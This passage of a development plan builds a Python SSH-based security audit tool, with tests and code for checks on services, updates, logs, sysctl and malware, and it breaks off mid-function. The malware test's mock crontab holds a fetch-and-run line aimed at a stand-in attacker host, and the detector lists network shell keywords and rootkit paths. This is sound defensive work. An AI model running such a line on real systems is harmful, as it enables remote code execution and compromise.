    ww_files = [f for f in r.stdout.strip().split("\n") if f.strip()]
    if ww_files:
        findings.append(_make_finding("warning", "World-writable files", "WARN", f"{len(ww_files)} files: {', '.join(ww_files[:5])}", "Remove world-writable permissions: chmod o-w <file>"))
    else:
        findings.append(_make_finding("pass", "World-writable files", "PASS", "No world-writable files outside /tmp", ""))

    # /tmp mount options
    r = ssh.execute(server, "mount | grep ' /tmp '")
    if r.stdout.strip():
        mount_opts = r.stdout.strip()
        has_noexec = "noexec" in mount_opts
        has_nosuid = "nosuid" in mount_opts
        if has_noexec and has_nosuid:
            findings.append(_make_finding("pass", "/tmp mount options", "PASS", "noexec,nosuid on /tmp", ""))
        else:
            missing = []
            if not has_noexec:
                missing.append("noexec")
            if not has_nosuid:
                missing.append("nosuid")
            findings.append(_make_finding("warning", "/tmp mount options", "WARN", f"/tmp missing: {','.join(missing)}", f"Add {','.join(missing)} to /tmp in /etc/fstab"))
    else:
        findings.append(_make_finding("warning", "/tmp mount options", "WARN", "/tmp not a separate mount", "Mount /tmp as separate partition with noexec,nosuid"))

    # Sensitive file permissions
    r = ssh.execute(server, "ls -la /etc/shadow /etc/passwd /etc/ssh 2>/dev/null")
    output = r.stdout.strip()
    # /etc/shadow should not be world-readable
    bad_perms = False
    if output:
        for line in output.split("\n"):
            if "/etc/shadow" in line and (line[7] != "-" or line[4] != "-"):
                bad_perms = True
            if "/etc/ssh" in line and line[7] != "-":
                bad_perms = True
    if bad_perms:
        findings.append(_make_finding("critical", "Sensitive file permissions", "FAIL", "Insecure permissions detected", "Fix: chmod 640 /etc/shadow; chmod 700 /etc/ssh"))
    else:
        findings.append(_make_finding("pass", "Sensitive file permissions", "PASS", "Correct permissions on sensitive files", ""))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditFilesystem -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add filesystem audit category"
```

---

### Task 7: Services Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for services audit**

```python
from agensysadmin.tools.security import _audit_services


class TestAuditServices:
    def test_minimal_services(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="ssh.service\nsystemd-journald.service\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),  # no unnecessary services
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),  # no xinetd
        ]
        findings = _audit_services(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Running daemons"] == "INFO"
        assert statuses["Unnecessary services"] == "PASS"
        assert statuses["Legacy inetd/xinetd"] == "PASS"

    def test_bloated_services(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="ssh.service\navahi-daemon.service\ncups.service\nrpcbind.service\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="avahi-daemon.service\ncups.service\nrpcbind.service\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/usr/sbin/xinetd\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_services(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Unnecessary services"] == "warning"
        assert statuses["Legacy inetd/xinetd"] == "warning"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditServices -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_services`**

```python
_UNNECESSARY_SERVICES = {
    "avahi-daemon", "cups", "cups-browsed", "rpcbind", "rpc.mountd",
    "rpc.statd", "bluetooth", "ModemManager", "whoopsie",
}


def _audit_services(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Running daemons
    r = ssh.execute(server, "systemctl list-units --type=service --state=running --no-legend --no-pager 2>/dev/null | awk '{print $1}'")
    services = [s for s in r.stdout.strip().split("\n") if s.strip()]
    findings.append(_make_finding("info", "Running daemons", "INFO", f"{len(services)} services running", ""))

    # Unnecessary services
    r = ssh.execute(server, "systemctl list-units --type=service --state=running --no-legend --no-pager 2>/dev/null | awk '{print $1}'")
    running = {s.replace(".service", "") for s in r.stdout.strip().split("\n") if s.strip()}
    found_unnecessary = running & _UNNECESSARY_SERVICES
    if found_unnecessary:
        findings.append(_make_finding("warning", "Unnecessary services", "WARN", f"Running: {', '.join(sorted(found_unnecessary))}", f"Disable with: systemctl disable --now {' '.join(sorted(found_unnecessary))}"))
    else:
        findings.append(_make_finding("pass", "Unnecessary services", "PASS", "No unnecessary services detected", ""))

    # xinetd / inetd
    r = ssh.execute(server, "which xinetd inetd 2>/dev/null")
    if r.stdout.strip():
        findings.append(_make_finding("warning", "Legacy inetd/xinetd", "WARN", f"Found: {r.stdout.strip()}", "Remove legacy inetd/xinetd: apt remove xinetd"))
    else:
        findings.append(_make_finding("pass", "Legacy inetd/xinetd", "PASS", "No inetd/xinetd found", ""))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditServices -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add services audit category"
```

---

### Task 8: Updates Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for updates audit**

```python
from agensysadmin.tools.security import _audit_updates


class TestAuditUpdates:
    def test_up_to_date(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),  # apt update
            CommandResult(stdout="Listing...\n", stderr="", exit_code=0, duration_ms=10),  # apt list
            CommandResult(stdout="Listing...\n", stderr="", exit_code=0, duration_ms=10),  # security only
            CommandResult(stdout="5.15.0-91\n5.15.0-91\n", stderr="", exit_code=0, duration_ms=10),  # kernel
            CommandResult(stdout="/etc/apt/apt.conf.d/20auto-upgrades\n", stderr="", exit_code=0, duration_ms=10),  # unattended
        ]
        findings = _audit_updates(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Pending updates"] == "PASS"
        assert statuses["Security updates"] == "PASS"
        assert statuses["Kernel version"] == "PASS"
        assert statuses["Unattended upgrades"] == "PASS"

    def test_outdated_system(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(
                stdout="Listing...\nlibssl3/jammy-updates 3.0.2 amd64\ncurl/jammy-updates 7.81 amd64\n",
                stderr="", exit_code=0, duration_ms=10,
            ),
            CommandResult(
                stdout="Listing...\nlibssl3/jammy-security 3.0.2 amd64\n",
                stderr="", exit_code=0, duration_ms=10,
            ),
            CommandResult(stdout="5.15.0-88\n5.15.0-91\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),
        ]
        findings = _audit_updates(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Pending updates"] == "warning"
        assert statuses["Security updates"] == "critical"
        assert statuses["Kernel version"] == "warning"
        assert statuses["Unattended upgrades"] == "warning"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditUpdates -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_updates`**

```python
def _audit_updates(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Run apt update
    ssh.execute(server, "sudo apt-get update -qq 2>/dev/null", timeout=60)

    # Pending updates
    r = ssh.execute(server, "apt list --upgradable 2>/dev/null")
    pkg_lines = [l for l in r.stdout.strip().split("\n") if l.strip() and not l.startswith("Listing")]
    if pkg_lines:
        findings.append(_make_finding("warning", "Pending updates", "WARN", f"{len(pkg_lines)} packages need updating", "Run: sudo apt upgrade"))
    else:
        findings.append(_make_finding("pass", "Pending updates", "PASS", "All packages up to date", ""))

    # Security updates
    r = ssh.execute(server, "apt list --upgradable 2>/dev/null | grep -i security")
    sec_lines = [l for l in r.stdout.strip().split("\n") if l.strip() and not l.startswith("Listing")]
    if sec_lines:
        findings.append(_make_finding("critical", "Security updates", "FAIL", f"{len(sec_lines)} security updates pending", "Run immediately: sudo apt upgrade"))
    else:
        findings.append(_make_finding("pass", "Security updates", "PASS", "No pending security updates", ""))

    # Kernel version
    r = ssh.execute(server, "uname -r | sed 's/-[a-z].*//'; apt-cache policy linux-image-$(dpkg --print-architecture) 2>/dev/null | grep Candidate | awk '{print $2}' | sed 's/-[a-z].*//'")
    versions = [v.strip() for v in r.stdout.strip().split("\n") if v.strip()]
    if len(versions) >= 2 and versions[0] != versions[1]:
        findings.append(_make_finding("warning", "Kernel version", "WARN", f"Running {versions[0]}, available {versions[1]}", "Update kernel and reboot"))
    else:
        current = versions[0] if versions else "unknown"
        findings.append(_make_finding("pass", "Kernel version", "PASS", f"Kernel {current} is current", ""))

    # Unattended upgrades
    r = ssh.execute(server, "ls /etc/apt/apt.conf.d/20auto-upgrades 2>/dev/null")
    if r.exit_code == 0 and r.stdout.strip():
        findings.append(_make_finding("pass", "Unattended upgrades", "PASS", "Auto-upgrades configured", ""))
    else:
        findings.append(_make_finding("warning", "Unattended upgrades", "WARN", "Unattended-upgrades not configured", "Install: apt install unattended-upgrades && dpkg-reconfigure unattended-upgrades"))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditUpdates -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add updates audit category"
```

---

### Task 9: Logs & Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for logs audit**

```python
from agensysadmin.tools.security import _audit_logs


class TestAuditLogs:
    def test_well_configured(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="active\n", stderr="", exit_code=0, duration_ms=10),  # fail2ban
            CommandResult(stdout="active\n", stderr="", exit_code=0, duration_ms=10),  # auditd
            CommandResult(stdout="/etc/logrotate.conf\n", stderr="", exit_code=0, duration_ms=10),  # logrotate
            CommandResult(stdout="42\n", stderr="", exit_code=0, duration_ms=10),  # failed logins
            CommandResult(stdout="Apr 1 root : cmd1\n", stderr="", exit_code=0, duration_ms=10),  # sudo log
        ]
        findings = _audit_logs(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["fail2ban"] == "PASS"
        assert statuses["auditd"] == "PASS"
        assert statuses["Logrotate"] == "PASS"
        assert statuses["Failed login attempts"] == "INFO"
        assert statuses["Recent sudo activity"] == "INFO"

    def test_no_security_tools(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="", stderr="", exit_code=3, duration_ms=10),  # fail2ban inactive
            CommandResult(stdout="", stderr="", exit_code=4, duration_ms=10),  # auditd not found
            CommandResult(stdout="/etc/logrotate.conf\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="0\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_logs(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["fail2ban"] == "warning"
        assert statuses["auditd"] == "info"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditLogs -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_logs`**

```python
def _audit_logs(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # fail2ban
    r = ssh.execute(server, "systemctl is-active fail2ban 2>/dev/null")
    if r.stdout.strip() == "active":
        findings.append(_make_finding("pass", "fail2ban", "PASS", "fail2ban active", ""))
    else:
        findings.append(_make_finding("warning", "fail2ban", "WARN", "fail2ban not active", "Install: apt install fail2ban && systemctl enable --now fail2ban"))

    # auditd
    r = ssh.execute(server, "systemctl is-active auditd 2>/dev/null")
    if r.stdout.strip() == "active":
        findings.append(_make_finding("pass", "auditd", "PASS", "auditd active", ""))
    else:
        findings.append(_make_finding("info", "auditd", "INFO", "auditd not active", "Consider installing: apt install auditd"))

    # Logrotate
    r = ssh.execute(server, "ls /etc/logrotate.conf 2>/dev/null")
    if r.exit_code == 0 and r.stdout.strip():
        findings.append(_make_finding("pass", "Logrotate", "PASS", "Logrotate configured", ""))
    else:
        findings.append(_make_finding("info", "Logrotate", "INFO", "Logrotate not found", "Install: apt install logrotate"))

    # Failed login count
    r = ssh.execute(server, "sudo grep -c 'Failed password' /var/log/auth.log 2>/dev/null || echo 0")
    try:
        count = int(r.stdout.strip())
    except ValueError:
        count = 0
    findings.append(_make_finding("info", "Failed login attempts", "INFO", f"{count} failed login attempts in auth.log", ""))

    # Recent sudo activity
    r = ssh.execute(server, "sudo grep 'COMMAND=' /var/log/auth.log 2>/dev/null | tail -10")
    lines = [l for l in r.stdout.strip().split("\n") if l.strip()]
    findings.append(_make_finding("info", "Recent sudo activity", "INFO", f"{len(lines)} recent sudo commands", ""))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditLogs -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add logs & audit category"
```

---

### Task 10: Kernel & Sysctl Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for kernel audit**

```python
from agensysadmin.tools.security import _audit_kernel


class TestAuditKernel:
    def test_hardened_kernel(self, mock_ssh):
        sysctl_output = (
            "net.ipv4.ip_forward = 0\n"
            "net.ipv4.tcp_syncookies = 1\n"
            "net.ipv4.conf.all.rp_filter = 1\n"
            "net.ipv4.conf.all.accept_redirects = 0\n"
            "net.ipv4.conf.all.send_redirects = 0\n"
            "kernel.randomize_va_space = 2\n"
            "fs.protected_hardlinks = 1\n"
            "fs.protected_symlinks = 1\n"
        )
        mock_ssh.execute.return_value = CommandResult(
            stdout=sysctl_output, stderr="", exit_code=0, duration_ms=10,
        )
        findings = _audit_kernel(mock_ssh, "prod")
        for f in findings:
            assert f["status"] == "PASS", f"Expected PASS for {f['check']}, got {f['status']}"

    def test_unhardened_kernel(self, mock_ssh):
        sysctl_output = (
            "net.ipv4.ip_forward = 1\n"
            "net.ipv4.tcp_syncookies = 0\n"
            "net.ipv4.conf.all.rp_filter = 0\n"
            "net.ipv4.conf.all.accept_redirects = 1\n"
            "net.ipv4.conf.all.send_redirects = 1\n"
            "kernel.randomize_va_space = 0\n"
            "fs.protected_hardlinks = 0\n"
            "fs.protected_symlinks = 0\n"
        )
        mock_ssh.execute.return_value = CommandResult(
            stdout=sysctl_output, stderr="", exit_code=0, duration_ms=10,
        )
        findings = _audit_kernel(mock_ssh, "prod")
        severities = {f["check"]: f["severity"] for f in findings}
        assert severities["ASLR (randomize_va_space)"] == "critical"
        assert severities["IP forwarding"] == "warning"
        assert severities["SYN cookies"] == "warning"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditKernel -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_kernel`**

```python
_SYSCTL_CHECKS = [
    ("net.ipv4.ip_forward", "0", "warning", "IP forwarding", "Disable: sysctl -w net.ipv4.ip_forward=0"),
    ("net.ipv4.tcp_syncookies", "1", "warning", "SYN cookies", "Enable: sysctl -w net.ipv4.tcp_syncookies=1"),
    ("net.ipv4.conf.all.rp_filter", "1", "warning", "Reverse path filtering", "Enable: sysctl -w net.ipv4.conf.all.rp_filter=1"),
    ("net.ipv4.conf.all.accept_redirects", "0", "warning", "ICMP redirects", "Disable: sysctl -w net.ipv4.conf.all.accept_redirects=0"),
    ("net.ipv4.conf.all.send_redirects", "0", "warning", "Send redirects", "Disable: sysctl -w net.ipv4.conf.all.send_redirects=0"),
    ("kernel.randomize_va_space", "2", "critical", "ASLR (randomize_va_space)", "Enable: sysctl -w kernel.randomize_va_space=2"),
    ("fs.protected_hardlinks", "1", "warning", "Protected hardlinks", "Enable: sysctl -w fs.protected_hardlinks=1"),
    ("fs.protected_symlinks", "1", "warning", "Protected symlinks", "Enable: sysctl -w fs.protected_symlinks=1"),
]


def _audit_kernel(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    keys = " ".join(c[0] for c in _SYSCTL_CHECKS)
    r = ssh.execute(server, f"sysctl {keys} 2>/dev/null")
    values = {}
    for line in r.stdout.strip().split("\n"):
        if "=" in line:
            k, v = line.split("=", 1)
            values[k.strip()] = v.strip()

    for key, expected, severity, check_name, recommendation in _SYSCTL_CHECKS:
        actual = values.get(key, "unknown")
        if actual == expected:
            findings.append(_make_finding("pass", check_name, "PASS", f"{key} = {actual}", ""))
        else:
            findings.append(_make_finding(severity, check_name, "FAIL" if severity == "critical" else "WARN", f"{key} = {actual} (expected {expected})", recommendation))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditKernel -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add kernel & sysctl audit category"
```

---

### Task 11: Malware/Rootkit Audit Category

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write tests for malware audit**

```python
from agensysadmin.tools.security import _audit_malware


class TestAuditMalware:
    def test_clean_system(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="# empty crontab\n", stderr="", exit_code=0, duration_ms=10),  # crontabs
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),  # deleted binaries
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),  # rootkit paths
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),  # hidden files
            CommandResult(stdout="127.0.0.1 localhost\n::1 localhost\n", stderr="", exit_code=0, duration_ms=10),  # hosts
        ]
        findings = _audit_malware(mock_ssh, "prod")
        statuses = {f["check"]: f["status"] for f in findings}
        assert statuses["Suspicious crontab entries"] == "PASS"
        assert statuses["Processes without binary"] == "PASS"
        assert statuses["Known rootkit paths"] == "PASS"
        assert statuses["Hidden files in /tmp, /dev/shm"] == "PASS"
        assert statuses["Suspicious /etc/hosts entries"] == "PASS"

    def test_compromised_system(self, mock_ssh):
        mock_ssh.execute.side_effect = [
            CommandResult(stdout="* * * * * curl http://evil.com/shell.sh | bash\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="1234 /proc/1234/exe (deleted)\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/tmp/.ice-unix/.x\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout=".hidden_miner\n.backdoor\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="127.0.0.1 localhost\n1.2.3.4 google.com\n", stderr="", exit_code=0, duration_ms=10),
        ]
        findings = _audit_malware(mock_ssh, "prod")
        statuses = {f["check"]: f["severity"] for f in findings}
        assert statuses["Suspicious crontab entries"] == "warning"
        assert statuses["Processes without binary"] == "critical"
        assert statuses["Known rootkit paths"] == "critical"
        assert statuses["Hidden files in /tmp, /dev/shm"] == "warning"
        assert statuses["Suspicious /etc/hosts entries"] == "warning"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditMalware -v 2>&1 | head -20`

- [ ] **Step 3: Implement `_audit_malware`**

```python
def _audit_malware(ssh: SSHManager, server: str) -> list[dict]:
    findings = []

    # Suspicious crontab entries
    r = ssh.execute(server, "for u in $(cut -f1 -d: /etc/passwd); do crontab -l -u $u 2>/dev/null; done; cat /etc/crontab /etc/cron.d/* 2>/dev/null")
    cron_lines = [l for l in r.stdout.strip().split("\n") if l.strip() and not l.startswith("#")]
    suspicious_cron = [l for l in cron_lines if any(kw in l.lower() for kw in ["curl", "wget", "bash -c", "/dev/tcp", "base64", "eval", "nc ", "ncat"])]
    if suspicious_cron:
        findings.append(_make_finding("warning", "Suspicious crontab entries", "WARN", f"{len(suspicious_cron)} suspicious entries found", "Review crontab entries for malicious commands"))
    else:
        findings.append(_make_finding("pass", "Suspicious crontab entries", "PASS", "No suspicious crontab entries", ""))

    # Processes without on-disk binary
    r = ssh.execute(server, "ls -la /proc/*/exe 2>/dev/null | grep '(deleted)'")
    deleted = [l for l in r.stdout.strip().split("\n") if l.strip()]
    if deleted:
        findings.append(_make_finding("critical", "Processes without binary", "FAIL", f"{len(deleted)} processes with deleted binaries", "Investigate processes running from deleted binaries"))
    else:
        findings.append(_make_finding("pass", "Processes without binary", "PASS", "All processes have on-disk binaries", ""))

    # Known rootkit paths
    r = ssh.execute(server, "ls -la /tmp/.ice-unix/.x /tmp/.font-unix/.x /dev/shm/.x /usr/lib/libamplify.so /usr/bin/.sshd 2>/dev/null")
    if r.stdout.strip():
        findings.append(_make_finding("critical", "Known rootkit paths", "FAIL", f"Found: {r.stdout.strip()}", "Investigate immediately — possible rootkit"))
    else:
        findings.append(_make_finding("pass", "Known rootkit paths", "PASS", "No known rootkit files found", ""))

    # Hidden files in /tmp, /dev/shm
    r = ssh.execute(server, "find /tmp /dev/shm -maxdepth 2 -name '.*' -not -name '.' -not -name '..' -not -name '.ICE-unix' -not -name '.X11-unix' -not -name '.font-unix' -not -name '.XIM-unix' 2>/dev/null")
    hidden = [f for f in r.stdout.strip().split("\n") if f.strip()]
    if hidden:
        findings.append(_make_finding("warning", "Hidden files in /tmp, /dev/shm", "WARN", f"{len(hidden)} hidden files: {', '.join(hidden[:5])}", "Review hidden files in /tmp and /dev/shm"))
    else:
        findings.append(_make_finding("pass", "Hidden files in /tmp, /dev/shm", "PASS", "No suspicious hidden files", ""))

    # Suspicious /etc/hosts entries
    r = ssh.execute(server, "cat /etc/hosts 2>/dev/null")
    hosts_lines = [l.strip() for l in r.stdout.strip().split("\n") if l.strip() and not l.startswith("#")]
    suspicious_hosts = [l for l in hosts_lines if not any(kw in l for kw in ["localhost", "ip6-", "ff02::", "fe00::", "127.0.0.1", "::1"])]
    if suspicious_hosts:
        findings.append(_make_finding("warning", "Suspicious /etc/hosts entries", "WARN", f"{len(suspicious_hosts)} non-standard entries", "Review /etc/hosts for hijacked domains"))
    else:
        findings.append(_make_finding("pass", "Suspicious /etc/hosts entries", "PASS", "Only standard entries in /etc/hosts", ""))

    return findings
```

- [ ] **Step 4: Run tests, verify pass**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestAuditMalware -v`

- [ ] **Step 5: Commit**

```bash
git add src/agensysadmin/tools/security.py tests/test_tools_security.py
git commit -m "feat(security): add malware/rootkit audit category"
```

---

### Task 12: Orchestrator Function and MCP Tool Registration

**Files:**
- Modify: `src/agensysadmin/tools/security.py`
- Modify: `src/agensysadmin/server.py`
- Modify: `tests/test_tools_security.py`

- [ ] **Step 1: Write test for `full_security_audit_impl`**

```python
from agensysadmin.tools.security import full_security_audit_impl


class TestFullSecurityAudit:
    def test_returns_complete_structure(self, mock_ssh):
        # Provide enough mock responses for all 10 categories
        # SSH: 6 commands
        ssh_responses = [
            CommandResult(stdout="PermitRootLogin no\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="PasswordAuthentication no\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="PubkeyAuthentication yes\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="Port 2222\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="MaxAuthTries 3\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="AllowUsers admin\n", stderr="", exit_code=0, duration_ms=10),
        ]
        # Firewall: 2 commands (ufw found + status)
        fw_responses = [
            CommandResult(stdout="/usr/sbin/ufw\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="Status: active\nDefault: deny (incoming), allow (outgoing)\n", stderr="", exit_code=0, duration_ms=10),
        ]
        # Users: 4 commands
        users_responses = [
            CommandResult(stdout="root\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),
        ]
        # Network: 3 commands
        net_responses = [
            CommandResult(stdout="tcp LISTEN 0.0.0.0:22\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="1\n", stderr="", exit_code=0, duration_ms=10),
        ]
        # Filesystem: 4 commands
        fs_responses = [
            CommandResult(stdout="/usr/bin/passwd\n/usr/bin/sudo\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/dev/sda2 on /tmp type ext4 (rw,nosuid,noexec)\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="-rw-r----- 1 root shadow 1234 Jan 1 00:00 /etc/shadow\n", stderr="", exit_code=0, duration_ms=10),
        ]
        # Services: 3 commands
        svc_responses = [
            CommandResult(stdout="ssh.service\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="ssh.service\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=1, duration_ms=10),
        ]
        # Updates: 5 commands
        upd_responses = [
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="Listing...\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="Listing...\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="6.1.0-43\n6.1.0-43\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/etc/apt/apt.conf.d/20auto-upgrades\n", stderr="", exit_code=0, duration_ms=10),
        ]
        # Logs: 5 commands
        log_responses = [
            CommandResult(stdout="active\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="active\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="/etc/logrotate.conf\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="0\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
        ]
        # Kernel: 1 command (sysctl batch)
        kernel_responses = [
            CommandResult(
                stdout=(
                    "net.ipv4.ip_forward = 0\n"
                    "net.ipv4.tcp_syncookies = 1\n"
                    "net.ipv4.conf.all.rp_filter = 1\n"
                    "net.ipv4.conf.all.accept_redirects = 0\n"
                    "net.ipv4.conf.all.send_redirects = 0\n"
                    "kernel.randomize_va_space = 2\n"
                    "fs.protected_hardlinks = 1\n"
                    "fs.protected_symlinks = 1\n"
                ),
                stderr="", exit_code=0, duration_ms=10,
            ),
        ]
        # Malware: 5 commands
        malware_responses = [
            CommandResult(stdout="# empty\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="127.0.0.1 localhost\n", stderr="", exit_code=0, duration_ms=10),
        ]
        # Hostname/IP: 2 commands at start
        meta_responses = [
            CommandResult(stdout="testhost\n", stderr="", exit_code=0, duration_ms=10),
            CommandResult(stdout="1.2.3.4\n", stderr="", exit_code=0, duration_ms=10),
        ]

        mock_ssh.execute.side_effect = (
            meta_responses
            + ssh_responses + fw_responses + users_responses
            + net_responses + fs_responses + svc_responses
            + upd_responses + log_responses + kernel_responses
            + malware_responses
        )

        result = full_security_audit_impl(mock_ssh, "prod")

        assert "score" in result
        assert "grade" in result
        assert "summary" in result
        assert "categories" in result
        assert "report_markdown" in result
        assert isinstance(result["score"], int)
        assert result["grade"] in ("A", "B", "C", "D", "F")
        assert "# Security Audit Report" in result["report_markdown"]
        assert len(result["categories"]) == 10
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /d/AI/AgenSysAdmin && /d/AI/AgenSysAdmin/.venv/Scripts/python.exe -m pytest tests/test_tools_security.py::TestFullSecurityAudit -v 2>&1 | head -20`

- [ ] **Step 3: Implement `full_security_audit_impl`**

Add at the end of `src/agensysadmin/tools/security.py`:

```python
def full_security_audit_impl(ssh: SSHManager, server: str) -> dict:
    # Get server metadata
    hostname = ssh.execute(server, "hostname").stdout.strip() or server
    ip = ssh.execute(server, "hostname -I 2>/dev/null | awk '{print $1}'").stdout.strip() or "unknown"

    # Run all category audits
    categories = {
